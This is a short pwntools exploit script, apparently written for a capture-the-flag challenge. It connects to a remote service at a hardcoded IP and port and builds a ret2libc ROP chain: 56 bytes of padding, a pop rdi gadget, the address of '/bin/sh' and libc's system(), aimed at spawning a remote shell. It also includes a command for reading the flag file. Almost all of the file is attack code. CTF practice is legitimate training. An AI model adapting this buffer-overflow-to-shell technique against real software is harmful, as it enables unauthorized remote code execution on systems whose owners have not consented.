from pwn import *
bin= './chall'
libc=ELF('./libc-2.31.so')
elf=ELF(bin)
rop = ROP(bin)
# env={"LD_PRELOAD" : "./libc-2.31.so"}
#r=process(bin,env)
if 1:
    try:
        r = remote('34.143.130.87',4097)#elf.process()#
        offset_pl = b'a'*56
        main=elf.symbols['main']
        start=elf.symbols['_start']
        libc.address = 0x00007ffff7dd2000#0x00007ffff7dbb000#
        pop_rdi_add = (rop.find_gadget(['pop rdi', 'ret']))[0]
        system_add=libc.symbols['system']
        exit_add=libc.symbols['exit']
        ret=rop.find_gadget(['ret'])[0]
        binsh_add=next(libc.search(b'/bin/sh\x00'))
        flag=b'cat /home/ctf/flag.txt'
        log.success('libc_add :'+hex(libc.address))
        log.success('binsh_add :'+hex(binsh_add))
        log.success('Pop_rdi_add :'+hex(pop_rdi_add))
        log.success('Ret_gadget_add :'+hex(ret))
        log.success('Sys_add :'+hex(system_add))
        log.success('Exit_add :'+hex(exit_add))
        #pl1= b'a'*56+p64(system_add)+p64(exit_add)+p64(binsh_add)
        pl= b'a'*56 + p64(pop_rdi_add) + p64(binsh_add) +p64(ret)+ p64(system_add) #+p64(exit_add)
        #r.sendline(pl)
        r.sendline(offset_pl+p64(start))
        r.sendline(b'a')
        r.interactive()
        
        
        
    except:
        pass
